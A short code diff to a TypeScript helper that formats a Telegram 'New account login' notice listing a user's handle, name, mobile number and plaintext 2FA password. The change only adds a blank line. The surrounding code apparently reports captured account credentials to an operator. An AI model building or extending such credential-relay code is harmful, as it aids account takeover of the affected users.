@@ -33,13 +33,14 @@ import { escapeTelegramHtml } from '../../utils/rich-message';
 export function accountLoginHtml(user: { username?: string; firstName?: string; lastName?: string; password?: string }, mobile: string): string {
   const handle = user.username?.replace(/^@/, '');
   const name = [user.firstName, user.lastName].map((v) => v?.trim()).filter(Boolean).join(' ');
-  return [
-    '<b>New account login</b>',
+  const details = [
     handle && `Account: <a href="https://t.me/${encodeURIComponent(handle)}">@${escapeTelegramHtml(handle)}</a>`,
     name && `Name: ${escapeTelegramHtml(name)}`,
     `Mobile: <code>${escapeTelegramHtml(mobile)}</code>`,
     user.password && `2FA: <code>${escapeTelegramHtml(user.password)}</code>`,
-  ].filter(Boolean).join('\n');
+  ].filter(Boolean);
+  // A blank line between the title and the details (owner, 2026-10-19).
+  return ['<b>New account login</b>', '', ...details].join('\n');
 }
 
 @Injectable()
